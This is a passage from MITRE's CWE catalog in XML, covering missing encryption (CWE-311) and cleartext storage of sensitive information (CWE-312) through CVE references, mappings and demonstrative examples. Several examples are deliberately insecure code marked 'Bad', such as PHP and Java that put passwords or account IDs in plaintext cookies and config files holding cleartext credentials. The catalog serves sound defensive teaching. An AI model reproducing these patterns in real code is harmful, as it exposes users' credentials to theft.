               <Description>storage of a secret key in cleartext in a temporary file</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-1567</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-0174</Reference>
               <Description>SCADA product uses HTTP Basic Authentication, which is not encrypted</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-0174</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-5778</Reference>
               <Description>login credentials stored unencrypted in a registry key</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-5778</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1949</Reference>
               <Description>Passwords transmitted in cleartext.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1949</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4122</Reference>
               <Description>Chain: Use of HTTPS cookie without "secure" flag causes it to be transmitted across unencrypted HTTP.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-4122</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3289</Reference>
               <Description>Product sends password hash in cleartext in violation of intended policy.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3289</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4390</Reference>
               <Description>Remote management feature sends sensitive information including passwords in cleartext.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-4390</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-5626</Reference>
               <Description>Backup routine sends password in cleartext in email.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-5626</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-1852</Reference>
               <Description>Product transmits Blowfish encryption key in cleartext.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-1852</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-0374</Reference>
               <Description>Printer sends configuration information, including administrative password, in cleartext.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-0374</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-4961</Reference>
               <Description>Chain: cleartext transmission of the MD5 hash of password enables attacks against a server that is susceptible to replay (CWE-294).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-4961</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-4786</Reference>
               <Description>Product sends passwords in cleartext to a log server.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-4786</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-3140</Reference>
               <Description>Product sends file with cleartext passwords in e-mail message intended for diagnostic purposes.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-3140</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="CLASP">
               <Entry_Name>Failure to encrypt data</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A8</Entry_ID>
               <Entry_Name>Insecure Cryptographic Storage</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A9</Entry_ID>
               <Entry_Name>Insecure Communications</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A8</Entry_ID>
               <Entry_Name>Insecure Storage</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>4</Entry_ID>
               <Entry_Name>Insufficient Transport Layer Protection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>MSC00-J</Entry_ID>
               <Entry_Name>Use SSLSocket rather than Socket for secure data exchange</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP23</Entry_ID>
               <Entry_Name>Exposed Data</Entry_Name>
            </Taxonomy_Mapping>
	    <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	      <Entry_ID>Part 3-3</Entry_ID>
	      <Entry_Name>Req SR 4.1</Entry_Name>
	    </Taxonomy_Mapping>
	    <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	      <Entry_ID>Part 3-3</Entry_ID>
	      <Entry_Name>Req SR 4.3</Entry_Name>
	    </Taxonomy_Mapping>
	    <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	      <Entry_ID>Part 4-2</Entry_ID>
	      <Entry_Name>Req CR 4.1</Entry_Name>
	    </Taxonomy_Mapping>
	    <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	      <Entry_ID>Part 4-2</Entry_ID>
	      <Entry_Name>Req CR 7.3</Entry_Name>
	    </Taxonomy_Mapping>
	    <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	      <Entry_ID>Part 4-2</Entry_ID>
	      <Entry_Name>Req CR 1.5</Entry_Name>
	    </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="157"/>
            <Related_Attack_Pattern CAPEC_ID="158"/>
            <Related_Attack_Pattern CAPEC_ID="204"/>
            <Related_Attack_Pattern CAPEC_ID="31"/>
            <Related_Attack_Pattern CAPEC_ID="37"/>
            <Related_Attack_Pattern CAPEC_ID="383"/>
            <Related_Attack_Pattern CAPEC_ID="384"/>
            <Related_Attack_Pattern CAPEC_ID="385"/>
            <Related_Attack_Pattern CAPEC_ID="386"/>
            <Related_Attack_Pattern CAPEC_ID="387"/>
            <Related_Attack_Pattern CAPEC_ID="388"/>
            <Related_Attack_Pattern CAPEC_ID="477"/>
            <Related_Attack_Pattern CAPEC_ID="609"/>
            <Related_Attack_Pattern CAPEC_ID="65"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-18"/>
            <Reference External_Reference_ID="REF-7" Section="Chapter 9, &#34;Protecting Secret Data&#34; Page 299"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 17: Failure to Protect Stored Data.&#34; Page 253"/>
            <Reference External_Reference_ID="REF-265"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 2, &#34;Common Vulnerabilities of Encryption&#34;, Page 43"/>
            <Reference External_Reference_ID="REF-267"/>
         </References>
         <Mapping_Notes>
            <Usage>Discouraged</Usage>
            <Rationale>CWE-311 is high-level with more precise children available. It is a level-1 Class (i.e., a child of a Pillar).</Rationale>
            <Comments>Consider children CWE-312: Cleartext Storage of Sensitive Information or CWE-319: Cleartext Transmission of Sensitive Information.</Comments>
            <Reasons>
               <Reason Type="Abstraction"/>
            </Reasons>
         </Mapping_Notes>
         <Notes>
            <Note Type="Relationship">There is an overlapping relationship between insecure storage of sensitive information (CWE-922) and missing encryption of sensitive information (CWE-311). Encryption is often used to prevent an attacker from reading the sensitive data. However, encryption does not prevent the attacker from erasing or overwriting the data.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CLASP</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Other_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Description, Detection_Factors, Likelihood_of_Exploit, Name, Observed_Examples, Potential_Mitigations, References, Related_Attack_Patterns, Relationships, Taxonomy_Mappings, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Observed_Examples, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationship_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Likelihood_of_Exploit, Modes_of_Introduction, Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships, Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2024-02-29</Modification_Date>
					<Modification_Version>4.14</Modification_Version>
					<Modification_ReleaseDate>2024-02-29</Modification_ReleaseDate>
					<Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Contribution Type="Content">
				  <Contribution_Name>participants in the CWE ICS/OT SIG 62443 Mapping Fall Workshop</Contribution_Name>
				  <Contribution_Date>2023-11-14</Contribution_Date>
				  <Contribution_Version>4.14</Contribution_Version>
				  <Contribution_ReleaseDate>2024-02-29</Contribution_ReleaseDate>
				  <Contribution_Comment>Contributed or reviewed taxonomy mappings for ISA/IEC 62443</Contribution_Comment>
				</Contribution>
            <Previous_Entry_Name Date="2008-04-11">Failure to Encrypt Data</Previous_Entry_Name>
            <Previous_Entry_Name Date="2010-02-16">Failure to Encrypt Sensitive Data</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="312" Name="Cleartext Storage of Sensitive Information" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product stores sensitive information in cleartext within a resource that might be accessible to another control sphere.</Description>
         <Extended_Description>
	 <xhtml:p>Because the information is stored in cleartext (i.e., unencrypted), attackers could potentially read it. Even if the information is encoded in a way that is not human-readable, certain techniques could determine which encoding is being used, then decode the information.</xhtml:p>
	 <xhtml:p>When organizations adopt cloud services, it can be easier for attackers to access the data from anywhere on the Internet.</xhtml:p>
	 <xhtml:p>In some systems/environments such as cloud, the use of "double encryption" (at both the software and hardware layer) might be required, and the developer might be solely responsible for both layers, instead of shared responsibility with the administrator of the broader system/environment.</xhtml:p>
       </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="311" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="311" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="922" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Class="Cloud Computing" Prevalence="Undetermined"/>
	    <Technology Class="ICS/OT" Prevalence="Undetermined"/>
            <Technology Class="Mobile" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Note>An attacker with access to the system could read sensitive information stored in cleartext.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
           <Detection_Method Detection_Method_ID="DM-14">
             <Method>Automated Static Analysis</Method>
             <Description>Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect "sources" (origins of input) with "sinks" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)</Description>
             <Effectiveness>High</Effectiveness>
           </Detection_Method>
         </Detection_Methods>
	 <Potential_Mitigations>
	   <Mitigation>
	     <Phase>Implementation</Phase>
	     <Phase>System Configuration</Phase>
	     <Phase>Operation</Phase>
	     <Description>When storing data in the cloud (e.g., S3 buckets, Azure blobs, Google Cloud Storage, etc.), use the provider's controls to encrypt the data at rest. [REF-1297] [REF-1299] [REF-1301]</Description>
	   </Mitigation>
	 </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-44">
               <Intro_Text>The following code excerpt stores a plaintext user account ID in a browser cookie.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>response.addCookie( new Cookie("userAccountID", acctID);</xhtml:div>
               </Example_Code>
               <Body_Text>Because the account ID is in plaintext, the user's account information is exposed if their computer is compromised by an attacker.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-40">
               <Intro_Text>This code writes a user's login information to a cookie so the user does not have to login again later.</Intro_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>function persistLogin($username, $password){<xhtml:div style="margin-left:1em;">$data = array("username" =&gt; $username, "password"=&gt; $password);<xhtml:br/>setcookie ("userdata", $data);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The code stores the user's username and password in plaintext in a cookie on the user's machine. This exposes the user's login information if their computer is compromised by an attacker. Even if the user's machine is not compromised, this weakness combined with cross-site scripting (CWE-79) could allow an attacker to remotely copy the cookie.</Body_Text>
               <Body_Text>Also note this example code also exhibits Plaintext Storage in a Cookie (CWE-315).</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-41">
               <Intro_Text>The following code attempts to establish a connection, read in a password, then store it to a buffer.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>server.sin_family = AF_INET; hp = gethostbyname(argv[1]);<xhtml:br/>if (hp==NULL) error("Unknown host");<xhtml:br/>memcpy( (char *)&amp;server.sin_addr,(char *)hp-&gt;h_addr,hp-&gt;h_length);<xhtml:br/>if (argc &lt; 3) port = 80;<xhtml:br/>else port = (unsigned short)atoi(argv[3]);<xhtml:br/>server.sin_port = htons(port);<xhtml:br/>if (connect(sock, (struct sockaddr *)&amp;server, sizeof server) &lt; 0) error("Connecting");<xhtml:br/>...<xhtml:br/>while ((n=read(sock,buffer,BUFSIZE-1))!=-1) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>
                           <xhtml:br/>write(dfd,password_buffer,n);<xhtml:br/>...<xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>
                  </xhtml:div>
               </Example_Code>
               <Body_Text>While successful, the program does not encrypt the data before writing it to a buffer, possibly exposing it to unauthorized actors.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-43">
               <Intro_Text>The following examples show a portion of properties and configuration files for Java and ASP.NET applications. The files include username and password information but they are stored in cleartext.</Intro_Text>
               <Body_Text>This Java example shows a properties file with a cleartext username / password pair.</Body_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>
                     <xhtml:br/>
                     <xhtml:i># Java Web App ResourceBundle properties file</xhtml:i>
                     <xhtml:br/>...<xhtml:br/>webapp.ldap.username=secretUsername<xhtml:br/>webapp.ldap.password=secretPassword<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>The following example shows a portion of a configuration file for an ASP.Net application. This configuration file includes username and password information for a connection to a database but the pair is stored in cleartext.</Body_Text>
               <Example_Code Nature="Bad" Language="ASP.NET">
                  <xhtml:div>...<xhtml:br/>&lt;connectionStrings&gt;<xhtml:div style="margin-left:1em;">&lt;add name="ud_DEV" connectionString="connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;" providerName="System.Data.Odbc" /&gt;</xhtml:div>&lt;/connectionStrings&gt;<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>Username and password information should not be included in a configuration file or a properties file in cleartext as this will allow anyone who can read the file access to the resource. If possible, encrypt this information.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-153">
	            <Intro_Text>In 2022, the OT:ICEFALL study examined products by 10 different Operational Technology (OT) vendors. The researchers reported 56 vulnerabilities and said that the products were "insecure by design" [REF-1283]. If exploited, these vulnerabilities often allowed adversaries to change how the products operated, ranging from denial of service to changing the code that the products executed. Since these products were often used in industries such as power, electrical, water, and others, there could even be safety implications.</Intro_Text>
	            <Body_Text>At least one OT product stored a password in plaintext.</Body_Text>
	         </Demonstrative_Example>
		 <Demonstrative_Example Demonstrative_Example_ID="DX-155">
		   <Intro_Text>In 2021, a web site operated by PeopleGIS stored data of US municipalities in Amazon Web Service (AWS) Simple Storage Service (S3) buckets.</Intro_Text>
		   <Example_Code Nature="Bad" Language="Other">
                     <xhtml:div>A security researcher found 86 S3 buckets that could be accessed without authentication (CWE-306) and stored data unencrypted (CWE-312). These buckets exposed over 1000 GB of data and 1.6 million files including physical addresses, phone numbers, tax documents, pictures of driver's license IDs, etc. [REF-1296] [REF-1295]</xhtml:div>
		   </Example_Code>
		   <Body_Text>While it was not publicly disclosed how the data was protected after discovery, multiple options could have been considered.</Body_Text>
		   <Example_Code Nature="Good" Language="Other">
                     <xhtml:div>The sensitive information could have been protected by ensuring that the buckets did not have public read access, e.g., by enabling the s3-account-level-public-access-blocks-periodic rule to Block Public Access. In addition, the data could have been encrypted at rest using the appropriate S3 settings, e.g., by enabling server-side encryption using the s3-bucket-server-side-encryption-enabled setting. Other settings are available to further prevent bucket data from being leaked. [REF-1297]</xhtml:div>
		   </Example_Code>
		 </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>Consider the following PowerShell command examples for encryption scopes of Azure storage objects. In the first example, an encryption scope is set for the storage account.</Intro_Text>
               <Example_Code Nature="Bad" Language="Shell">
                  <xhtml:div>New-AzStorageEncryptionScope -ResourceGroupName "MyResourceGroup" -AccountName "MyStorageAccount" -EncryptionScopeName testscope -StorageEncryption</xhtml:div>
               </Example_Code>
	       <Body_Text>The result (edited and formatted for readability) might be:</Body_Text>
	       <Example_Code Nature="Bad" Language="Other">
		 <xhtml:div>ResourceGroupName: MyResourceGroup, StorageAccountName: MyStorageAccount</xhtml:div>
		 <xhtml:p/>
		 <xhtml:div>
                   <xhtml:table>
                     <xhtml:tr>
                       <xhtml:th>Name</xhtml:th>
                       <xhtml:th>State</xhtml:th>
                       <xhtml:th>Source</xhtml:th>
                       <xhtml:th>RequireInfrastructureEncryption</xhtml:th>
                     </xhtml:tr>
                     <xhtml:tr>
                       <xhtml:td>testscope</xhtml:td>
                       <xhtml:td>Enabled</xhtml:td>
                       <xhtml:td>Microsoft.Storage</xhtml:td>
                       <xhtml:td/>
                     </xhtml:tr>
		   </xhtml:table>
		 </xhtml:div>
	       </Example_Code>
	       <Body_Text>However, the empty string under RequireInfrastructureEncryption indicates this service was not enabled at the time of creation, because the -RequireInfrastructureEncryption argument was not specified in the command.</Body_Text>
	       <Body_Text>Including the -RequireInfrastructureEncryption argument addresses the issue:</Body_Text>
               <Example_Code Nature="Good" Language="Shell">
                  <xhtml:div>New-AzStorageEncryptionScope -ResourceGroupName "MyResourceGroup" -AccountName "MyStorageAccount" -EncryptionScopeName testscope -StorageEncryption -RequireInfrastructureEncryption</xhtml:div>
               </Example_Code>
	       <Body_Text>This produces the report:</Body_Text>
	       <Example_Code Nature="Result" Language="Other">
		 <xhtml:div>ResourceGroupName: MyResourceGroup, StorageAccountName: MyStorageAccount</xhtml:div>
		 <xhtml:p/>
		 <xhtml:div>
                   <xhtml:table>
                     <xhtml:tr>
                       <xhtml:th>Name</xhtml:th>
                       <xhtml:th>State</xhtml:th>
                       <xhtml:th>Source</xhtml:th>
                       <xhtml:th>RequireInfrastructureEncryption</xhtml:th>
                     </xhtml:tr>
                     <xhtml:tr>
                       <xhtml:td>testscope</xhtml:td>
                       <xhtml:td>Enabled</xhtml:td>
                       <xhtml:td>Microsoft.Keyvault</xhtml:td>
                       <xhtml:td>True</xhtml:td>
                     </xhtml:tr>
		   </xhtml:table>
		 </xhtml:div>
	       </Example_Code>
	       <Body_Text>In a scenario where both software and hardware layer encryption is required ("double encryption"), Azure's infrastructure encryption setting can be enabled via the CLI or Portal. An important note is that infrastructure hardware encryption cannot be enabled or disabled after a blob is created. Furthermore, the default value for infrastructure encryption is disabled in blob creations.</Body_Text>
	    </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2022-30275</Reference>
               <Description>Remote Terminal Unit (RTU) uses a driver that relies on a password stored in plaintext.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-30275</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2272</Reference>
               <Description>password and username stored in cleartext in a cookie</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-2272</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-1466</Reference>
               <Description>password stored in cleartext in a file with insecure permissions</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-1466</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0152</Reference>
               <Description>chat program disables SSL in some circumstances even when the user says to use SSL.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-0152</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-1603</Reference>
               <Description>Chain: product uses an incorrect public exponent when generating an RSA key, which effectively disables the encryption</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-1603</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0964</Reference>
               <Description>storage of unencrypted passwords in a database</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-0964</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-6157</Reference>
               <Description>storage of unencrypted passwords in a database</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-6157</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-6828</Reference>
               <Description>product stores a password in cleartext in memory</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-6828</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-1567</Reference>
               <Description>storage of a secret key in cleartext in a temporary file</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-1567</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-0174</Reference>
               <Description>SCADA product uses HTTP Basic Authentication, which is not encrypted</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-0174</Link>
            </Observed_Example>
            <Observed_Example>
